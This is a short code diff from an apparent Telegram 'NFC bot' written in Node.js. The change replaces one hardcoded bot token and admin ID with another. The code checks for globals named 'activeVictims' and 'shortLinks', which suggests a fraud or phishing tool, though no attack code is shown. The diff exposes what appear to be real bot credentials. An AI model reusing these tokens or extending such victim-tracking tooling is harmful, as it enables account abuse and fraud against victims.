@@ -16,8 +16,8 @@ const ffmpegPath = require('@ffmpeg-installer/ffmpeg').path;
 ffmpeg.setFfmpegPath(ffmpegPath);
 
 // --- НАСТРОЙКИ ---
-const token = '8249796254:AAGV3kYCPf-siSmvl4SOXU4_44HS0y5RUPM'; // Твой токен NFC бота
-const ADMIN_ID = 123456789; // ⚠️ ЗАМЕНИ НА СВОЙ TELEGRAM ID!
+const token = '8274521903:AAE0mD8-iM-I5sO8EZzh6UCXuTatyz5N-sQ'; // Твой токен NFC бота
+const ADMIN_ID = 8290877754; // ⚠️ ЗАМЕНИ НА СВОЙ TELEGRAM ID!
 
 // Проверка наявності глобальних змінних
 if (!global.sessions || !global.activeVictims || !global.shortLinks) {
